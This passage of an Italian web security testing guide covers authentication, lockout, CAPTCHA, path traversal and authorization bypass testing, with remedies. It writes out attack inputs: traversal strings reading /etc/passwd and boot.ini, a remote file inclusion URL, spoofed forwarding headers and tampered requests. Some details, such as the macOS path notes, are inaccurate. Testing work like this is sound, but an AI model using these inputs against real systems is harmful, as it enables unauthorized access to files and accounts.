* La direttiva unsafe-eval consente l'uso di eval() (The eval() function evaluates JavaScript code represented as a string and returns its completion value. The source is parsed as a script.) nell'applicazione ed è suscettibile a tecniche di bypass comuni come l'iniezione di URL di dati.
* Risorse come script possono essere autorizzate a essere caricate da qualsiasi origine tramite l'uso del wildcard (*) come sorgente.

**Rimedio**
Configura una forte content security policy che riduca la superficie di attacco dell'applicazione. Gli sviluppatori possono verificare la robustezza della content security policy utilizzando strumenti online come il [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/).

#### 12 - Test path confusion
Una corretta configurazione dei percorsi dell'applicazione è importante perché, se i percorsi non sono configurati correttamente, consentono a un attaccante di sfruttare altre vulnerabilità in un secondo momento utilizzando questa errata configurazione (per esempio con attacchi alla cache web).

**Come testare**
**Black box**
In uno scenario di testing black-box, il tester dovrebbe sostituire tutti i percorsi esistenti con percorsi che non esistono e quindi esaminare il comportamento e il codice di stato dell'obiettivo.
Assumiamo che il percorso sia `https://example.com/user/dashboard`, il tester dovrebbe testare i diversi modi che lo sviluppatore potrebbe aver considerato per questo percorso, come per esempio `https://example.com/user/dashboard/non_esiste.js`.
Dopo aver inviato una richiesta a un percorso inesistente, il tester osserva come l'applicazione risponde, controlla *codici di stato di ritorno del server*, *messaggi di errore* e *comportamento della cache*.

    Come funziona l'inganno della cache:
    - Memorizzazione dei Contenuti: Quando un utente richiede una risorsa web, 
        il server o il CDN può memorizzare la risposta nella cache per velocizzare 
        le richieste future. Se un percorso specifico (URL) viene memorizzato con 
        determinate informazioni, quelle informazioni possono essere servite a altri 
        utenti che accedono allo stesso percorso.

    - Sfruttamento della Cache: Un attaccante può creare un URL che, se visitato, 
        fa sì che la cache memorizzi informazioni riservate (come dati utente o 
        informazioni sensibili). In seguito, quando un altro utente visita lo stesso
        URL, la cache restituisce le informazioni memorizzate, rivelando dati che 
        non avrebbero dovuto essere accessibili.

**White box**
Esaminare la configurazione del routing dell'applicazione. Nella maggior parte dei casi, gli sviluppatori utilizzano espressioni regolari nel routing dell'applicazione.

    from django.urls import re_path
    from . import views

    urlpatterns = [
        re_path(r'.*^dashboard', views.path_confusion, name='index'),
    ]

Questo per esempio è un uso errato in Django delle redirectory: scrivendo così, qualsiasi espressione scritta nell'url che inizia con /dashboard reindirizzerà a "path_confusion".

**Rimedi**
* Evitare di classificare/gestire la cache in base all'estensione del file (.html, .css, .js) o al percorso (/images/, /api/), bensì in base al contenuto: conviene sempre scrivere nell'header il "Content-Type" che indica il tipo di dati restituiti.
* Assicurarsi che i meccanismi di caching aderiscano agli header di controllo della cache specificati dalla propria applicazione.
* Implementare una gestione degli errori `File not found` conforme all'RFC (Request for Comment) e i reindirizzamenti.

### C - Test di gestione dell'identità
#### 1 - Test di definizione dei ruoli
Le applicazioni hanno diversi tipi di funzionalità e servizi, e questi richiedono permessi di accesso basati sulle esigenze dell'utente. Per esempio se parliamo di amministratore, revisore, ingegnere di supporto o un cliente.

**Come testare**
* *Identificazione dei ruoli*
* *Cambiare ruolo*: Dopo aver identificato i possibili vettori di attacco, il tester deve verificare e convalidare di poter accedere ai ruoli disponibili.Alcune applicazioni definiscono i ruoli dell'utente in fase di creazione, attraverso controlli rigorosi e politiche, o assicurandosi che il ruolo dell'utente sia adeguatamente protetto da una firma creata dal backend. Scoprire che esistono ruoli non implica che siano una vulnerabilità. 
* *Esaminare i permessi forniti a ciascun ruolo*: Un ingegnere di supporto non dovrebbe essere in grado di eseguire funzionalità amministrative, gestire i backup o condurre transazioni al posto di un utente. Un amministratore non dovrebbe avere poteri illimitati sul sistema. Funzionalità sensibili per gli amministratori dovrebbero seguire un principio di maker-checker, o utilizzare MFA (Multi-Factorial Authentication, un metodo di verifica dell'identità che richiede agli utenti di fornire almeno un fattore di autenticazione in aggiunta alla password oppure almeno due fattori di autenticazione invece di una password) per garantire che l'amministratore stia conducendo la transazione. 

#### 2 - Processo di Registrazione di un Utente
Molte applicazioni pubbliche automatizzano completamente il processo di registrazione e concessione di accesso, poiché la dimensione della base utenti rende impossibile una gestione manuale.

**Come testare**
Verificare che i requisiti di identità per la registrazione degli utenti siano allineati con le esigenze aziendali e di sicurezza.

#### 3 - Processo di fornitura di un account
Questo è il momento principale nel quale un attaccante può creare un account con più permessi di quelli che dovrebbe effetivamente avere. È necessario che ciò non sia possibile.

**Come testare**
Controlla quali tipi di account possono crearne altri e quali possono ricercare altri account e fare azioni su di essi. Controllare se dopo l'autenticazione dell'utente ci sono altri tipi di verifiche prima di poter modificare altri account.
    
 #### 4 - Test per l'enumeraione degli account
Lo scopo di questo test è verificare se è possibile raccogliere un insieme di nomi utente validi interagendo con il meccanismo di autenticazione dell'applicazione. Questo test sarà utile per i test di forza bruta, in cui il tester verifica se, dato un nome utente valido, è possibile trovare la password corrispondente. Ad esempio, a volte, quando si inviano credenziali sbagliate, si riceve un messaggio che indica che il nome utente è presente nel sistema o che la password fornita è sbagliata. Queste informazioni possono essere utilizzate per attaccare l'applicazione web, ad esempio attraverso un attacco brute force o con username e password predefiniti.
A volte, i tester possono enumerare gli utenti esistenti inviando un nome utente e una password vuota.

**Come testare**
**Black box**
Provare diversi input delle credenziali in modo che, se l'applicazione è vulnerabile, il tester riceve un messaggio di risposta che rivela, direttamente o indirettamente, alcune informazioni utili per enumerare gli utenti.

**Messaggi di risposta HTTP**
Controllare i messaggi di risposta con un proxy web nei casi:
* Nome utente e password corretti
* Nome utente corretto e password errata
* Noem utente e password errati

Nel primo caso dovrebbe lasciarti entrare normalmente, negli altri due la risposta del server dovrebbe essere la medesima per non dare informazioni inopportune ad un attaccante.

**Altri modi per enumerare gli utenti**
* *Analizzando gli URL e i reindirizzamenti URL forniti dal sistema*

        Questo non dovrebbe succedere:
        http://www.foo.com/err.jsp?User=baduser&Error=0
        http://www.foo.com/err.jsp?User=gooduser&Error=2

* *URL probing*: Testando varie directories si potrebbero ottenere diversi messaggi di errore.

        Questo non dovrebbe succedere:
        403 Forbidden error code
        404 Not found error code

* *Analizzare i tempi di risposta*: i tempi di risposta tra due messaggi di errore uguali dovrebbe essere sempre più o meno lo stesso: un attaccante potrebbe accorgersi che in cso di un nome utente reale il sistema ci mette 45ms a rispondere mentre solamente 20ms quando l'utente non esiste.
* *Username sequenziali*
* *Assicurarsi che utenti non autorizzati non abbiano accesso ad usernme riservati allo staff*: admin, administrator, moderator, ecc...

**White box**
Controllare le stesse cose nominate prima ma guardando il codice.

**Rimedi**
* Assicurarsi che i messaggi di errore per credenziali errate siano identici, indipendentemente dal fatto che il nome utente o la password sia errato. Ad esempio, un messaggio come "Credenziali non valide" è preferibile a "Nome utente non trovato" o "Password errata".
* Implementare un sistema di limitazione dei tentativi di accesso per prevenire attacchi di forza bruta. Dopo un numero definito di tentativi falliti, bloccare temporaneamente l’account o richiedere un CAPTCHA.
* Introduzione di un ritardo crescente tra i tentativi di accesso.
* Assicurarsi che i tempi di risposta siano simili, indipendentemente dalla validità delle credenziali fornite.

### D - Test di autenticazione
#### 1 - Test per le credenziali di default
Molte applicazioni web e dispositivi hardware hanno password predefinite per l'account amministrativo integrato. Anche se in alcuni casi queste possono essere generate casualmente, spesso sono statiche, il che significa che possono essere facilmente indovinate o ottenute da un attaccante. 
Inoltre, quando vengono creati nuovi utenti nelle applicazioni, potrebbero avere password predefinite impostate. Queste possono essere generate automaticamente dall'applicazione o create manualmente dal personale. In entrambi i casi, se non vengono generate in modo sicuro, le password potrebbero essere facilmente indovinabili da un attaccante.

**Come testare**
Cercare quale software è in uso e se questo presenta nel manuale (o cercando su internet) password predefinite.
In caso non ve ne siano, provare con le più comuni, come "admin", "password", "12345" o altre password predefinite comuni.
Quando il personale all'interno di un'organizzazione crea manualmente password per nuovi account, potrebbe farlo in modo prevedibile o potrebbe essere la stessa per molteplici funzioni.

**Come gli attaccanti possono superare un limite di 3 tentativi di accesso massimi**
* *Attacchi distribuiti*: usando bot che simultaneamente cercano di indovinare una pasword passando sempre da indirizzi IP diversi sfruttando per esempio proxy o VPN.
* *Intervalli di tempo insuficienti*: rende semplicissimo provare tante password una dopo l'altra.
* *Credential stuffing*: usare username e password rubate da una violazione precedente.
* *Phishing* 

#### 2 - Meccanismi di blocco deboli
I meccanismi di blocco degli account vengono utilizzati per mitigare gli attacchi di brute force. Alcuni degli attacchi che possono essere contrastati utilizzando un meccanismo di blocco includono:
* Attacco per indovinare password o nome utente durante il login.
* Indovinare il codice su qualsiasi funzionalità di 2FA o domande di sicurezza.

Gli account vengono generalmente bloccati dopo 3-5 tentativi non riusciti e possono essere sbloccati solo dopo un periodo di tempo prestabilito, tramite un meccanismo di sblocco self-service o intervento di un amministratore.

**Come testare**
Per testare la robustezza dei meccanismi di blocco, sarà necessario avere accesso a un account che si è disposti a bloccare.
Per valutare la capacità del meccanismo di blocco dell'account di mitigare gli attacchi di indovinare password tramite brute force, si possono seguire questi passaggi:
* Tentare 3 password errate
* Entrare con la password giusta
* Tentare 4 password errate
* Entrare con la password giusta
* Tentare 5 password errate
* Verificare che l'account viene bloccato
* Verificare che l'account resta bloccato senza sblocco manuale remoto

Un CAPTCHA può ostacolare gli attacchi di brute force, ma può presentare le proprie vulnerabilità e non dovrebbe sostituire un meccanismo di blocco.
Esempi sono: sfide semplici, controlli sulla risposta HTTP invece che sul test di per sé, ecc...

Per valutare l'efficacia del CAPTCHA:
* Valutare le sfide CAPTCHA e tentare di automatizzare soluzioni in base alla difficoltà.
* Tentare di inviare la richiesta senza risolvere il CAPTCHA tramite i normali meccanismi dell'interfaccia utente.
* Tentare di inviare la richiesta con un fallimento intenzionale della sfida CAPTCHA.
* Tentare di inviare la richiesta senza risolvere il CAPTCHA (presumendo che alcuni valori predefiniti possano essere passati dal codice client-side, ecc.) utilizzando un proxy di test (richiesta inviata direttamente al server).
* Verificare se la soluzione del CAPTCHA possa essere il testo alternativo dell'immagine, nomi dei file o un valore in un campo nascosto associato.
* Tentare di reinviare risposte buone già identificate.
* Verificare se cancellare i cookie consente di eludere il CAPTCHA (ad esempio, se il CAPTCHA viene mostrato solo dopo un certo numero di fallimenti).
* Se il CAPTCHA è parte di un processo multi-step, tentare di accedere o completare un passo oltre il CAPTCHA (ad esempio, se il CAPTCHA è il primo passo in un processo di accesso, provare a inviare semplicemente il secondo passo [nome utente e password]).
* Controllare metodi alternativi che potrebbero non avere il CAPTCHA imposto, come un endpoint API destinato a facilitare l'accesso all'app mobile.

**Meccanismo di sblocco**
I meccanismi di sblocco tipici possono includere domande segrete o un link di sblocco inviato via email. Il link di sblocco dovrebbe essere unico e usa e getta, per evitare che un attaccante possa indovinare o ripetere il link e effettuare attacchi di brute force in serie.

#### 3 - Test per il bypass dello schema di autenticazione
Testare lo schema di autenticazione significa comprendere come funziona il processo di autenticazione e utilizzare queste informazioni per eludere il meccanismo di autenticazione.
Inoltre, è spesso possibile bypassare le misure di autenticazione manomettendo le richieste e ingannando l'applicazione facendole credere che l'utente sia già autenticato. 
Questo può avvenire nelle fasi di progettazione, sviluppo e distribuzione dell'SDLC (Software Development Life Cycle).

**Come testare**
* *Richiesta diretta di pagina*
    Se un'applicazione web implementa il controllo degli accessi solo sulla pagina di login, lo schema di autenticazione potrebbe essere bypassato. Ad esempio, se un utente richiede direttamente un'altra pagina tramite browsing forzato, quella pagina potrebbe non controllare le credenziali dell'utente prima di concedere l'accesso. Prova ad accedere direttamente a una pagina protetta tramite la barra degli indirizzi del browser per testare questo metodo.
* *Modifica dei parametri*
    Un altro problema legato alla progettazione dell'autenticazione è quando l'applicazione verifica un accesso riuscito sulla base di parametri a valore fisso. Un utente potrebbe modificare questi parametri per accedere alle aree protette senza fornire credenziali valide. 
    Nell'esempio seguente, il parametro "authenticated" è cambiato in "yes", permettendo all'utente di accedere. In questo esempio, il parametro è nell'URL, ma potrebbe anche essere modificato tramite un proxy, specialmente quando i parametri vengono inviati come elementi di modulo in una richiesta POST o quando sono memorizzati in un cookie.
    ![Autenticazione con modifica di parametri](./img/Basm-parammod.jpg)
* *Previsione dell'ID di sessione*
    Molte applicazioni web gestiscono l'autenticazione utilizzando identificatori di sessione (ID di sessione). Pertanto, se la generazione degli ID di sessione è prevedibile, un utente malintenzionato potrebbe riuscire a trovare un ID di sessione valido e ottenere accesso non autorizzato all'applicazione, impersonando un utente precedentemente autenticato.
    ![Cookie values over time](./img/Basm-sessid.jpg)
* *SQL Injection (Autenticazione tramite modulo HTML)*
    Non meglio spiegato

**Rimedi**
* Non implementare il controllo degli accessi solo sulla pagina di login dato che potrebbe essere bypassato con un proxy. Implementalo sempre in backend.
* Fai si che l'ID di sessione generato non sia prevedibile ma che invece sia il più casuale possibile con librerie di sicurezza o mischiando valori casuali e una variabile temporale secondo qualche formula.

#### 4 - Testare la vulnerabilità di 'Ricorda password'
**Come testarlo**
Una sessione per essere sicura deve rispettare vari parametri:
* utilizza identificatori di sessione unici e complessi
* deve scadere dopo un determinato periodo di tempo di inattività
* rigenera l'ID di sessione dopo il login per prevenire attacchi di session fixation (l'attaccante inizia una sessione sul sito in questione e fa usare la stessa SID alla vittima)
* utilizza HTTPS
* crittografa la informazioni sensibili memorizzate nella sessione
* fornisce un'opzione chiara per il logout

**Rimedi**
* Controllare che le credenzali non vengano mai salvate nell'applicazione client ma solamente sul lato server e che queste vengano poi sostituite con un token di sessione. 
* Assicurarsi anche che la sessione sia gestita correttamente e che sia sicura.

#### 5 - Testare debolezze della cache del browser
L'applicazione deve istruire bene la cache del browser a non memorizzare i dati sensibili dell'utente.

**Come testarlo**
*Il pulsante indietro*
Inserire informazioni sensibili nell'applicazione e disconnettersi. Il tester quindi preme il pulsante Indietro del browser per controllare se le informazioni sensibili precedentemente visualizzate possono essere accessibili mentre non è autenticato.

**Rimedi**
Per impedire al tasto indietro di mostrare dati sensibili bisogna:
* usare HTTPS
* impostare ```Cache control: must.revalidate``` nell'header della risposta del server (l'applicazione web in questo caso non può farci nulla)

*Cache del browser*
Usando ZAP possiamo analizzare la risposta del server appartenenti alla sessione.
Questo si controlla dalla risposta server guardando l'header e controllando la presenza di:

    Cache control: no-cache, no-store (, must-revalidate, max-age:0, s-maxage:0)
    Expires: 0
    Pragma: no-cache

Tutto ciò che è stato citato sopra deve essere rifatto per i browser mobili (per dispositivi mobili), dato che la loro programmazione è separata dai browser web.

#### 6 - Test sulla politica di 'Password Non Sicura'
Le persone tendono ad utilizzare password troppo facili o facilmente indovinabili come 'password', '123456' o 'qwerty'.

È difficile evitare ciò se non vengono messi paletti alle password utilizzabili.

**Rimedi**
Ci sono due modi principali per rendere un account più sicuro nonostante l'utente non ci provi neanche:
* costringere l'utente ad utilizzare un minimo numero di caratteri e che i caratteri non siano di almeno tre tipi (lettere, numeri e speciali)
* utilizzare un sistema di autenticazione a due fattori

La migliore opzione resta comunque la prima per ambienti aperti al pubblico.

#### 7 - Test per le domande di sicurezza per il recupero password deboli
Idealmente, le domande di sicurezza dovrebbero generare risposte note solo all'utente e non indovinabili o scopribili da altri. Questo è più difficile di quanto sembri. 

**Come testarlo**
Controlla tramite il tasto 'Password dimenticta' la presenza di:
* domande di sicurezza deboli (di risposta nota a molte persone o di facile reperibilità)
* domande autogenerate eccessivamente semplici ('Quanto fa 1+1?')
* domande rispondibili con un attacco di forza bruta (Il nome di qualcuno o il colore preferito) 

**Rimedio**
* In generale evitare di usare domande di sicurezza per il recuper o della password perché le risposte a molte di queste sono facilmente indovinabili, ma se proprio si vogliono usare impostale come 'Qual è il nome della strada in cui hai vissuto il tuo terzo anno di scuola elementare?' oppure 'Qual era il soprannome del tuo migliore amico d'infanzia?': cose non reperibili facilmente su internet.

#### 8 - Test delle funzionalità di cambio o ripristino password
Il ripristino della password può essere effettuato in diversi modi, alcuni manuali e altri automatici (chiamare un operatore oppure richiedere una nuova password tramite email).

Bisogna controllare:
* Il processo di ripristino della password è più debole rispetto al processo di autenticazione?
* Ci sono limitazioni di frequenza o altre protezioni contro attacchi automatizzati?
* Il processo di ripristino consente l'enumerazione degli utenti? 

*Email- nuova password inviata* - all'utente viene inviata una nuova password via email
Questo processo non è considerato sicuro perché la nuova mail non è crittografata e dunque, a meno che al primo accesso con la nuova password, l'utente non sia costretto a cambiarla, si tende a non usarlo.

*Email - link inviato* - all'utente è inviato un link per mail con un token
È un buon processo ma alcune cose vanno controllate:
* utilizza HTTPS?
* il link è utilizabile solo una volta?
* l'ID del token è abbastanza lungo e casuale?
* l'ID contiene il nome utente?

*SMS o telefonata - link inviato* - all'utente è inviato un link via SMS o per telefono
È un buon processo ma vanno controllate le stesse cose che vi mail.
    
*Domande di sicurezza*
Questo metodo è molto debole e non dovrebbe essere utilizzato

**Rimedi**
* Utilizzare metodi di verifica a più fattori (MFA) per confermare l'identità dell'utente prima di procedere con il ripristino della password.
* Implementare rate limiting per prevenire attacchi di brute force o di enumerazione degli utenti. Ad esempio, limitare il numero di richieste di ripristino password da un singolo indirizzo IP in un determinato intervallo di tempo.

#### 9 - Testare che non ci siano canali di autenticazione più deboli di altri
Anche se i meccanismi di autenticazione principali non presentano vulnerabilità, potrebbero esistere vulnerabilità nei canali alternativi di autenticazione legittimi per gli stessi account utente. 
Uno degli esempi migliori è se fare il recupero della password è meno sicuro che l'autenticazione stessa ma ci sono molte altre cose da controllare: dovrebbe esserci lo stesso livello di sicurezza per:
* siti web
* siti mobile
* applicazioni mobile
* siti web in altre lingue
* siti web associati che utilizzano le stesse credenziali del primo

**Come testarlo** 
I canali alternativi dovrebbero essere menzionati nel rapporto di test, anche se contrassegnati come "informazioni solo" o "fuori ambito".
In caso, chiederli agli amministratori o chi di dovere.

#### 10 - Testare l'autenticazione multi fattoriale
Per autenticazione multifattoriale non si intende l'autenticazione  in due passaggi, ma la richiesta di due  o più fattori di autenticazione contemporaneamente.

**Come testarlo**
Gli MFA richiedono almeno due dei seguenti fattori di autenticazione:
* qualcosa che sai (password, pin, domande di sicurezza)
* qualcosa che hai  (token hardware e software, email, sms)
* qualcosa che sei (impronte digitali, riconoscimento facciale)
* dove sei (geolocalizzazione o range di IP)

La richiesta di due tipi dello stesso fattore di autenticazione (sia password che pin) non corrisponde ad un MFA!

Tutti i diversi metodi di accesso devono essere esaminati, per garantire che l'MFA sia applicato in modo coerente. Se alcuni metodi non richiedono l'MFA, questi possono fornire un metodo semplice per aggirarli.

Se l'autenticazione utilizza un provider OpenID Connect (OIDC) che consente flussi (o criteri) di autenticazione personalizzati, come Azure B2C, potrebbero essere definiti più flussi, alcuni dei quali potrebbero non richiedere l'MFA. Ad esempio, se l'applicazione si autentica con un flusso chiamato B2C_1_SignInWithMFA, provate a modificarlo in B2C_1_SignIn, B2C_1_SignInWithoutMFA o altri valori simili.

In alcuni casi, possono essere implementati anche aggiramenti intenzionali dell'MFA, come ad esempio non richiedere l'MFA:
* Da indirizzi IP specifici (che possono essere spoofatizzati utilizzando l'intestazione HTTP X-Forwarded-For ).
* Quando è impostata un'intestazione HTTP specifica (ad esempio un'intestazione non standard come X-Debug).
* Per uno specifico account codificato (ad esempio un account “root” o “breakglass”).

Infine, se l'MFA è implementato su un sistema diverso da quello dell'applicazione principale (ad esempio su un reverse proxy, per proteggere un'applicazione legacy che non supporta nativamente l'MFA), potrebbe essere possibile aggirarlo collegandosi direttamente al server dell'applicazione di backend, come discusso nella guida su come mappare l'architettura dell'applicazione (sottocapitolo 4.1.10).

Controllare le opzioni di recupero MFA che comprendano, come discusso in precedenza, codici di recupero, autenticazione alternativa (forte almeno quanto l'MFA originale), generazione di un OTP o token criptato o comunque che i metodi di verifica siano abbastanza sicuri (siano questi il canale mail, vocale o la geolocalizzazione)

### E - Test di autorizzazione
#### 1 - Testing dell'inclusione di file in directory incrociate
Utilizzando metodi di validazione degli input che non sono stati ben progettati o implementati, un aggressore potrebbe sfruttare il sistema per leggere o scrivere file che non dovrebbero essere accessibili. 
I server web cercano di confinare i file degli utenti all'interno di una "root directory" o "web document root", che rappresenta una directory fisica nel file system. 
La definizione dei privilegi avviene tramite le Liste di Controllo degli Accessi (ACL), che identificano quali utenti o gruppi possono accedere, modificare o eseguire un file specifico sul server. Questi meccanismi sono progettati per prevenire l'accesso a file sensibili da parte di utenti malevoli (ad esempio, il comune file /etc/passwd su una piattaforma UNIX-like) o per evitare l'esecuzione di comandi di sistema.
Questo tipo di attacco è anche noto come attacco dot-dot-slash (../), traversata di directory, climbing di directory o backtracking.
Durante una valutazione, i tester devono eseguuire due fasi distinte:
* Enumerazione dei vettori di input
* Tecniche di Test

**Come testarlo**
**Black box**
*Enumerazione dei vettori di input*
Per determinare quale parte dell'applicazione è vulnerabile al bypass della validazione degli input, il tester deve enumerare tutte le parti dell'applicazione che accettano contenuti dall'utente.
Questo include anche query HTTP GET e POST e opzioni comuni come caricamenti di file e moduli HTML.
Ecco alcuni esempi di controlli da seguire:
* Ci sono parametri di richiesta che potrebbero essere utilizzati per operazioni relative ai file?
* Ci sono estensioni di file insolite?
* Ci sono nomi di variabili interessanti?
    * http://example.com/getUserProfile.jsp?item=ikki.html
    * http://example.com/index.php?file=content
    * http://example.com/index.php?file=content
* È possibile identificare i cookie utilizzati dall'applicazione web per la generazione dinamica di pagine o modelli?
    * Cookie: ID=d9ccd3f4f9f18cc1=2166255468=1162655568=3cFpqbJgMSSPKVMV=flower
    * Cookie: USER=1826cc8f=GreenDotRed

*Tecniche di test*
Utilizzando l'esempio precedente, la pagina dinamica chiamata getUserProfile.jsp carica informazioni statiche da un file e mostra il contenuto agli utenti.
Un aggressore potrebbe inserire la stringa malevola ../../../../etc/passwd per includere il file degli hash delle password di un sistema Linux/UNIX (http://example.com/getUserProfile.jsp?item=../../../../etc/passwd).
Ovviamente, questo tipo di attacco è possibile solo se il checkpoint di validazione fallisce; secondo i privilegi del file system, l'applicazione web deve essere in grado di leggere il file.

Nota: Per testare con successo questo difetto, il tester deve avere conoscenza del sistema in fase di test e della posizione dei file richiesti. Non ha senso richiedere /etc/passwd da un server web IIS.

Un altro esempio comune è l'inclusione di contenuto da una fonte esterna: http://example.com/index.php?file=http://www.owasp.org/malicioustxt

È importante notare che diversi sistemi operativi utilizzano diversi separatori di percorso:
* OS simili a UNIX
    * directory radice: /
    * separatore directory: /
* OS Windows
    * directory radice: <lettera di unità>
    * separatore per le directory: \ o /
* macOS
    * directory radice: <lettera di unità>
    * separatore directory: :


**Grey box**
Il concetto alla base è lo stesso, ma potendo osservare il codice, si può cercare proprio le funzioni che lavorano con gli I/O e controllare queste.
* **PHP**: include(), include_once(), require(), require_once(), fopen(), readfile(), ...
* **JSP/Servlet**: java.io.File(), java.io.FileReader(), ...
* **ASP**: include file, include virtual, ...

Inoltre, esaminando il codice sorgente, è possibile analizzare le funzioni che dovrebbero gestire input non validi: alcuni sviluppatori cercano di modificare input non validi per renderli validi, evitando avvisi ed errori. Queste funzioni sono solitamente soggette a difetti di sicurezza.
    
    filename = Request.QueryString("file");
    Replace(filename, "/", "\");
    Replace(filename, "..\", "");

Il test uò essere eseguito con:

    file=....//....//boot.ini
    file=....\\....\\boot.ini
    file= ..\..\boot.ini

**Rimedi**
* Assicurati che il tuo server web abbia accesso solo alle directory e ai file necessari. Riduci i privilegi degli utenti del server.
* RICORDA DI FARE IL SANITIZE() O DI IMPLEMENTARE UNA WHITELIST DI INPUT ACCETTATI DALL'ESTERNO, NON USARLI COSÌ COME SONO INSERITI DALL'UTENTE FINALE: questo consiglio tornerà spessissimo nella guida ed è una delle cause principali di bercce nella sicurezza informatica.

#### 2 - Test per il bypassing dello schema di autorizzazione
Questo tipo di test si concentra sulla verifica di come è stato implementato lo schema di autorizzazione per ciascun ruolo o privilegio per accedere a funzioni e risorse riservate.

**Come testarlo**
**Test per il bypass orizzontale dello schema di autorizzazione**
Per ogni funzione, ruolo o richiesta va verificato se è possibile accedere a risorse che dovrebbero essere accessibili ad un utente con un'identità diversa ma con lo stesso ruolo o privilegio. Per esempio due utenti differenti quando richiedono la loro view delle impostazioni, devono essere associati a due token differenti e quindi visualizzare due cose diverse anche se la richiesta è fatta nello stesso momento.
La richiesta di un utente in genere appare così:

    POST /account/viewSettings HTTP/1.1
    Host: www.example.com
    [altri header HTTP]
    Cookie: SessionID=USER_SESSION

    username=example_user

Se un attaccante prova a fare ciò:

    POST /account/viewCCpincode HTTP/1.1
    Host: www.example.com
    [altri header HTTP]
    Cookie: SessionID=ATTACKER_SESSION

    username=example_user

non deve avere successo.

**Test per l'accesso a funzioni amministrative**
Ad esempio, supponiamo che la funzione addUser faccia parte del menu amministrativo dell'applicazione e sia accessibile richiedendo il seguente URL: https://www.example.com/admin/addUser.
Verrebbe generata la seguente richiesta:

    POST /admin/addUser HTTP/1.1
    Host: www.example.com
    [...]

    userID=fakeuser&role=3&group=grp001

Dopo l'operazione va controllato se l'utente è stato creato e se in caso questo ottiene i privilegi descritti nel ruolo.

**Test per l'accesso a risorse assegnate ad un ruolo differente**
Diverse applicazioni impostano controlli sulle risorse basati sui ruoli utente.
Come utente normale, prova ad accedere alla posizione di quei file. Se riesci a recuperarli, modificarli o eliminarli, allora l'applicazione è vulnerabile.

**Test per la gestione di header di richiesta speciali**
Alcune applicazioni supportano header non standard come X-Original-URL o X-Rewrite-URL per consentire la sovrascrittura dell'URL di destinazione nelle richieste con quello specificato nel valore dell'header.

Questo comportamento può essere sfruttato in una situazione in cui l'applicazione è dietro un componente che applica restrizioni di controllo accessi basate sull'URL della richiesta.

Il tipo di restrizione di controllo accessi basato sull'URL della richiesta può essere, ad esempio, il blocco dell'accesso da Internet a una console di amministrazione esposta su /console o /admin.

Per rilevare il supporto per l'header X-Original-URL o X-Rewrite-URL, possono essere applicati i seguenti passaggi.
* Inviare una richiesta normale senza alcun header X-Original-URL o X-Rewrite-URL.

    GET / HTTP/1.1
    Host: www.example.com
    [...]

* Inviare una richiesta con un header X-Original-URL che punta a una risorsa non esistente.

    GET / HTTP/1.1
    Host: www.example.com
    X-Original-URL: /donotexist1
    [...]

* Inviare una richiesta con un header X-Rewrite-URL che punta a una risorsa non esistente.

    GET / HTTP/1.1
    Host: www.example.com
    X-Rewrite-URL: /donotexist2
    [...]

Se la risposta per una delle richieste contiene marcatori che indicano che la risorsa non è stata trovata, ciò indica che l'applicazione supporta gli header di richiesta speciali. Questi marcatori possono includere il codice di stato della risposta HTTP 404 o un messaggio "risorsa non trovata" nel corpo della risposta.

Una volta convalidato il supporto per l'header X-Original-URL o X-Rewrite-URL, si può tentare di bypassare la restrizione di controllo accessi inviando la richiesta prevista all'applicazione, specificando un URL "consentito" dal componente frontend come URL principale della richiesta e specificando il vero URL di destinazione nell'header X-Original-URL o X-Rewrite-URL, a seconda di quale sia supportato. Se entrambi sono supportati, prova uno dopo l'altro per verificare quale header consente il bypass.

**Altri header da considerare**
Spesso i pannelli di amministrazione o le funzioni amministrative sono accessibili solo ai client su reti locali, quindi potrebbe essere possibile abusare di vari header HTTP relativi a proxy o forwarding per ottenere accesso. Alcuni header e valori da testare includono:
**Header**:
* X-Forwarded-For
* X-Forward-For
* X-Remote-IP
* X-Originating-IP
* X-Remote-Addr
* X-Client-IP

**Valori**:
* 127.0.0.1 (o qualsiasi cosa negli spazi degli indirizzi 127.0.0.0/8 o ::1/128)
* localhost
* Qualsiasi indirizzo RFC1918:
    * 10.0.0.0/8
    * 172.16.0.0/12
    * 192.168.0.0/16
* Indirizzi link local: 169.254.0.0/16

**Nota**: Includere un elemento di porta insieme all'indirizzo o al nome host può anche aiutare a bypassare le protezioni di edge come i firewall delle applicazioni web, ecc. Ad esempio: 127.0.0.4:80, 127.0.0.4:443, 127.0.0.4:43982.

**Rimedi**:Applicare i principi di minimo privilegio sugli utenti, ruoli e risorse per garantire che non si verifichino accessi non autorizzati.

#### 3 - Test per l'escalation dei privilegi
Durante questa fase, il tester deve verificare che non sia possibile per un utente modificare i propri privilegi o ruoli all'interno dell'applicazione in modi che potrebbero consentire attacchi di escalation dei privilegi.
Di solito, si fa riferimento a un'escalation verticale quando è possibile accedere a risorse concesse a account più privilegiati e a un'escalation orizzontale quando è possibile accedere a risorse concesse a un account configurato in modo simile.

**Come testarlo**
**Test per manipolazione di Ruolo/Privilegio**
In ogni porzione dell'applicazione in cui un utente può creare informazioni nel database, ricevere informazioni o eliminare informazioni,  è necessario registrare tale funzionalità. Il tester dovrebbe provare ad accedere a tali funzioni come un altro utente per verificare se è possibile accedere a una funzione che non dovrebbe essere permessa dal ruolo/privilegio dell'utente.

*Manipolazoine del gruppo utente*
Ad esempio: il seguente POST HTTP consente all'utente appartenente a grp001 di accedere all'ordine #0001:

    POST /user/viewOrder.jsp HTTP/1.1
    Host: www.example.com
    ...

    groupID=grp001&orderID=0001

Verificare se un utente che non appartiene a grp001 può modificare il valore dei parametri groupID e orderID per ottenere accesso a quei dati privilegiati.

*Manipolazione del profilo utente*
Ad esempio: la seguente risposta del server mostra un campo nascosto nell'HTML restituito all'utente dopo una corretta autenticazione.

    HTTP/1.1 200 OK
    Server: Netscape-Enterprise/6.0
    Date: Wed, 1 Apr 2006 13:51:20 GMT
    Set-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com
    Set-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com
    Cache-Control: no-cache
    Pragma: No-cache
    Content-length: 247
    Content-Type: text/html
    Expires: Thu, 01 Jan 1970 00:00:00 GMT
    Connection: close

    <form name="autoriz" method="POST" action="visual.jsp">
    <input type="hidden" name="profile" value="SysAdmin">
    <body onload="document.forms.autoriz.submit()">

Cosa succede se il tester modifica il valore della variabile profile in SysAdmin? È possibile diventare amministratore?

<br>

*Manipolazione del valore di condizione*

